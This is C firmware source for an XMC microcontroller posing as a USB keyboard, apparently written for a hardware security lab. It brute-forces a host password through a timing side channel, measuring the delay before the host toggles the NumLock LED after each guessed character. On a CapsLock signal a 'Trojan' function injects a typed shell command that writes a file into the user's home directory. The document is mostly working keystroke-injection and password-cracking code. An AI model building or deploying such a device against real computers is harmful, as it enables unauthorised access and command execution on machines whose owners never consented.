
#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0
#define AltGr_index 84
#define Shift_index 43
#define msg_len 92

volatile int i = 0;
int maxtime = 0;
int solutionlen = 0;

int password_enable = 1;
 int string_index = 0;
int stringlenght = 2;

uint8_t  global_string_len = 90;
volatile uint8_t global_index = 0; // Reset this to 0 to start typing
volatile uint32_t led_toggle_distance = 0; // The public distance value
static uint32_t last_led_tick = 0;         // Helper to remember the previous time
volatile uint32_t public_distance = 0; // Accessible everywhere

static uint8_t characterSent = 0, indexToSend = 0;
int msgiterator = 0;
	
int solution_paste_index = 0;

volatile uint32_t msTicks = 0;



int current_str_lenght = 2;
int string2sendlen = 2;

int current_string_length = 1;
int startTime = 0;
int trojanLen = 36;  // 36 Keydata structs
typedef struct { // Generic struct structure

uint8_t Key;
uint8_t Mod;




} Keydata;


Keydata keyLut [95]= {
    // Normal keys (mod = 0)
    {GERMAN_KEYBOARD_SC_A, 0},
    {GERMAN_KEYBOARD_SC_B, 0},
    {GERMAN_KEYBOARD_SC_C, 0},
    {GERMAN_KEYBOARD_SC_D, 0},
    {GERMAN_KEYBOARD_SC_E, 0},
    {GERMAN_KEYBOARD_SC_F, 0},
    {GERMAN_KEYBOARD_SC_G, 0},
    {GERMAN_KEYBOARD_SC_H, 0},
    {GERMAN_KEYBOARD_SC_I, 0},
    {GERMAN_KEYBOARD_SC_J, 0},
    {GERMAN_KEYBOARD_SC_K, 0},
    {GERMAN_KEYBOARD_SC_L, 0},
    {GERMAN_KEYBOARD_SC_M, 0},
    {GERMAN_KEYBOARD_SC_N, 0},
    {GERMAN_KEYBOARD_SC_O, 0},
    {GERMAN_KEYBOARD_SC_P, 0},
    {GERMAN_KEYBOARD_SC_Q, 0},
    {GERMAN_KEYBOARD_SC_R, 0},
    {GERMAN_KEYBOARD_SC_S, 0},
    {GERMAN_KEYBOARD_SC_T, 0},
    {GERMAN_KEYBOARD_SC_U, 0},
    {GERMAN_KEYBOARD_SC_V, 0},
    {GERMAN_KEYBOARD_SC_W, 0},
    {GERMAN_KEYBOARD_SC_X, 0},
    {GERMAN_KEYBOARD_SC_Y, 0},
    {GERMAN_KEYBOARD_SC_Z, 0},
    {GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION, 0},
    {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 0},
    {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 0},
    {GERMAN_KEYBOARD_SC_4_AND_DOLLAR, 0},
    {GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE, 0},
    {GERMAN_KEYBOARD_SC_6_AND_AMPERSAND, 0},
    {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, 0},
    {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 0},
    {GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET, 0},
    {GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, 0},
    {GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE, 0},
    {GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE, 0},
    {GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON, 0},
    {GERMAN_KEYBOARD_SC_DOT_AND_COLON, 0},
    {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, 0},
    {GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, 0},
    {GERMAN_KEYBOARD_SC_A, 1},// Shift keys (mod = 1)
    {GERMAN_KEYBOARD_SC_B, 1},
    {GERMAN_KEYBOARD_SC_C, 1},
    {GERMAN_KEYBOARD_SC_D, 1},
    {GERMAN_KEYBOARD_SC_E, 1},
    {GERMAN_KEYBOARD_SC_F, 1},
    {GERMAN_KEYBOARD_SC_G, 1},
    {GERMAN_KEYBOARD_SC_H, 1},
    {GERMAN_KEYBOARD_SC_I, 1},
    {GERMAN_KEYBOARD_SC_J, 1},
    {GERMAN_KEYBOARD_SC_K, 1},
    {GERMAN_KEYBOARD_SC_L, 1},
    {GERMAN_KEYBOARD_SC_M, 1},
    {GERMAN_KEYBOARD_SC_N, 1},
    {GERMAN_KEYBOARD_SC_O, 1},
    {GERMAN_KEYBOARD_SC_P, 1},
    {GERMAN_KEYBOARD_SC_Q, 1},
    {GERMAN_KEYBOARD_SC_R, 1},
    {GERMAN_KEYBOARD_SC_S, 1},
    {GERMAN_KEYBOARD_SC_T, 1},
    {GERMAN_KEYBOARD_SC_U, 1},
    {GERMAN_KEYBOARD_SC_V, 1},
    {GERMAN_KEYBOARD_SC_W, 1},
    {GERMAN_KEYBOARD_SC_X, 1},
    {GERMAN_KEYBOARD_SC_Y, 1},
    {GERMAN_KEYBOARD_SC_Z, 1},
    {GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION, 1},
    {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 1},
    {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 1},
    {GERMAN_KEYBOARD_SC_4_AND_DOLLAR, 1},
    {GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE, 1},
    {GERMAN_KEYBOARD_SC_6_AND_AMPERSAND, 1},
    {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, 1},
    {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 1},
    {GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET, 1},
    {GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, 1},
    {GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE, 1},
    {GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE, 1},
    {GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON, 1},
    {GERMAN_KEYBOARD_SC_DOT_AND_COLON, 1},
    {GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, 1},
    {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, 1},
    {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, 2},// AltGr keys (mod = 2)
    {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 2},
    {GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET, 2},
    {GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, 2},
    {GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE, 2},
    {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, 2},
    {GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH, 2}

};

Keydata solutionLut [50]= {
    // Normal keys (mod = 0)
    {GERMAN_KEYBOARD_SC_V, 0},
    {GERMAN_KEYBOARD_SC_G, 0},
    {GERMAN_KEYBOARD_SC_D, 0}
};

Keydata string2sendLut [50]= {
    // Normal keys (mod = 0)
    {GERMAN_KEYBOARD_SC_A, 0},
    {GERMAN_KEYBOARD_SC_ENTER, 0}
};

Keydata trojanInstuctionsLut []= { //echo "echo "Milo Valle" > $HOME/03813253
    // Normal keys (mod = 0)
    {HID_KEYBOARD_SC_CAPS_LOCK, 0},
    {GERMAN_KEYBOARD_SC_E, 0},
    {GERMAN_KEYBOARD_SC_C, 0},
    {GERMAN_KEYBOARD_SC_H, 0},
    {GERMAN_KEYBOARD_SC_O, 0},
    {GERMAN_KEYBOARD_SC_SPACE, 0},

    {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 1},
    {GERMAN_KEYBOARD_SC_M, 1},
    {GERMAN_KEYBOARD_SC_I, 0},
    {GERMAN_KEYBOARD_SC_L, 0},
    {GERMAN_KEYBOARD_SC_O, 0},
    {GERMAN_KEYBOARD_SC_SPACE, 0},
    {GERMAN_KEYBOARD_SC_V, 1},
    {GERMAN_KEYBOARD_SC_A, 0},
    {GERMAN_KEYBOARD_SC_L, 0},
    {GERMAN_KEYBOARD_SC_L, 0},
    {GERMAN_KEYBOARD_SC_E, 0},
    {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 1},
    {GERMAN_KEYBOARD_SC_SPACE, 0},

    {GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE, 1},
    {GERMAN_KEYBOARD_SC_SPACE, 0},

    {GERMAN_KEYBOARD_SC_4_AND_DOLLAR, 1},
    {GERMAN_KEYBOARD_SC_H, 1},
    {GERMAN_KEYBOARD_SC_O, 1},
    {GERMAN_KEYBOARD_SC_M, 1},
    {GERMAN_KEYBOARD_SC_E, 1},
    {GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE, 1},
    {GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE, 0},
    {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 0},
    {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET, 0},
    {GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION, 0},
    {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 0},
    {GERMAN_KEYBOARD_SC_2_AND_QUOTES, 0},
    {GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE, 0},
    {GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH, 0},
    {GERMAN_KEYBOARD_SC_ENTER, 0},
};

// void SysTick_Handler(void) {
//     msTicks++;
// }

// Helper to get current time
// uint32_t GetTick(void) {
//     return msTicks;
// }

// Insert for Keydata arrays (shifts structs)
void insertKeydata(Keydata arr[], int *size, int index, Keydata value) {
    for (int i = *size; i > index; --i) {
        arr[i] = arr[i - 1];
    }
    arr[index] = value;
    (*size)++;
}


void MeasureLedToggleDistance(void) {
        //public_distance = GetTick() - startTime; 
        public_distance = DWT -> CYCCNT - startTime;
        if (msgiterator > 0 && public_distance > maxtime) {
            maxtime = public_distance;
            solutionLut[solutionlen].Key = keyLut[msgiterator - 1].Key;
            solutionLut[solutionlen].Mod = keyLut[msgiterator - 1].Mod;
        }
}


void bufferlogic(void) {

        string2sendLut[current_string_length - 1] = keyLut[msgiterator]; //fill the buffer with the current key to send
        string2sendLut[current_string_length] = (Keydata){GERMAN_KEYBOARD_SC_ENTER, 0}; //append enter at the end
    
        msgiterator++;
    
            if (msgiterator >= msg_len) {
            
                insertKeydata(string2sendLut, &current_string_length, solution_paste_index, solutionLut[solutionlen]); //We move the max time solution in index 0 
                string2sendLut[current_string_length] = (Keydata){GERMAN_KEYBOARD_SC_ENTER, 0}; //append enter at the end
                string_index = 0;
                solutionlen++;
                solution_paste_index++;
                msgiterator = 0;
                maxtime = 0;
            }  


        string_index = 0; // Restart USB transmission


}
void ResetBufferLogic(void) {

    //Iterate in string2sendLut to reset key and Mod
    for (int i = 0; i < 40; i++) {
        string2sendLut[i].Key = 0;
        string2sendLut[i].Mod = 0;
    }
    for (int i = 0; i < 25; i++) {
        solutionLut[i].Key = 0;
        solutionLut[i].Mod = 0;
    }
    //reset all variables
    string_index = 0;
    current_string_length = 1;
    characterSent = 0;
    msgiterator = 0;
    maxtime = 0;
    solution_paste_index = 0;
    solutionlen = 0;

}

void Trojan(void) {
    //delay to stabilise
    startTime = 0;
    while (startTime < 500000){

         startTime++;
    }

    //ResetBufferLogic();

    memcpy(string2sendLut, trojanInstuctionsLut, trojanLen*sizeof(Keydata));
    
    
    string_index = 0;

}




/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();
	SystemCoreClockSetup();   
    //use DWT for more precise timing than SysTick (Stocazzo conta meglio il mio casio da 10 euro)
    CoreDebug -> DEMCR |= CoreDebug_DEMCR_TRCENA_Msk; // Enable DWT
    DWT -> CYCCNT = 0; // Reset the counter
    DWT -> CTRL |= DWT_CTRL_CYCCNTENA_Msk; // Enable the cycle counter 
    //SysTick_Config(SystemCoreClock / 1000000);
    //ResetBufferLogic();
	// Wait until host has enumerated HID device
	for(int i = 0; i < 10e6; ++i)
		; 

	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);

int total_reports = (current_string_length + 1) * 2; // 2 iterations 0 and 1 for each character



if (((string_index < total_reports) && (password_enable == 1)) || ((string_index < (trojanLen+1)) && (password_enable == 0))) {
    switch(string2sendLut[string_index].Mod) {
        case 0:
            if(characterSent) {
			    report->Reserved = 0; 
			    report->KeyCode[0] = 0; 
			    characterSent = 0;
			    string_index++; 
            }else {
			    report->Modifier = 0; 
			    report->Reserved = 0; 
			    report->KeyCode[0] = string2sendLut[string_index].Key;
                if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
                    //startTime = GetTick(); // Start timing when we are at the final report stage
                    startTime = DWT -> CYCCNT;
                }
			characterSent = 1;
		    }
		
            break;

        case 1: //shift
            if(characterSent) {
			    report->Reserved = 0; 
			    report->KeyCode[0] = 0; 
			    characterSent = 0;
			    string_index++; 
            }else{
			    report->Reserved = 0; 
			    report->KeyCode[0] = string2sendLut[string_index].Key;
            
                if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
                    //startTime = GetTick(); // Start timing when we are at the final report stage
                    startTime = DWT -> CYCCNT;
                    report -> Modifier = 0;
                }else{
                    report->Modifier = 0x02; 
                }

			characterSent = 1;
            }

            break;


        case 2: //AltGr
            if(characterSent) {
			    report->Reserved = 0; 
			    report->KeyCode[0] = 0; 
			    characterSent = 0;
			    string_index++; 
            }else{
			    report->Reserved = 0; 
			    report->KeyCode[0] = string2sendLut[string_index].Key;
            
                if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
                    //startTime = GetTick(); // Start timing when we are at the final report stage
                    startTime = DWT -> CYCCNT;
                    report -> Modifier = 0;
                }else{
                    report->Modifier = 0x40; 
                }

			characterSent = 1;
            }

            break;
        default:
            if(characterSent) {
			    report->Reserved = 0; 
			    report->KeyCode[0] = 0; 
			    characterSent = 0;
			    string_index++; 
            }else {
			    report->Modifier = 0; 
			    report->Reserved = 0; 
			    report->KeyCode[0] = string2sendLut[string_index].Key;
                if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
                    //startTime = GetTick(); // Start timing when we are at the final report stage
                    startTime = DWT -> CYCCNT;
                }
			characterSent = 1;
		    }
		
            break;
    }
	}
	return true;
}





// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;


	if(*report & HID_KEYBOARD_LED_NUMLOCK) {
        if (password_enable == 1){
            MeasureLedToggleDistance();
            bufferlogic();
        }

        XMC_GPIO_SetOutputHigh(LED1);

    }
	else 
		XMC_GPIO_SetOutputLow(LED1);
 
	
	
	if(*report & HID_KEYBOARD_LED_CAPSLOCK){
        password_enable = 0; // Disable password mode
		XMC_GPIO_SetOutputHigh(LED2);
        static bool hasRunTrojan = false;
        if (!hasRunTrojan) {
            
            Trojan();
            hasRunTrojan = true;
        }

    }else 
		XMC_GPIO_SetOutputLow(LED2);
}

void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}
                            